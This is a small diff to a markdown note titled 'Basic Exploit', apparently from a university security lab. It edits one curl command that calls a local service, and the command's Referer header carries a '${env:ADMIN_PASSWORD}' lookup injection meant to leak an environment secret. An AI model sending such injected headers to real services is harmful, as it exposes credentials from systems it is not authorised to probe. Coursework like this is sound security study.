@@ -1,6 +1,6 @@
 # Basic Exploit
 ```Bash
-curl http://localhost:8080/rest/wizards/isAlive -H 'GATECH_ID: 904160213' -H 'Content-type: application/json' -H 'Referer: TEST ${env:ADMIN_PASSWORD}'
+curl http://localhost:8080/rest/wizards/isAlive -H 'GATECH_ID: 904160213' -H 'Content-type: application/json' -H 'Referer: EXPLOIT ${env:ADMIN_PASSWORD}'
 
 
 ```
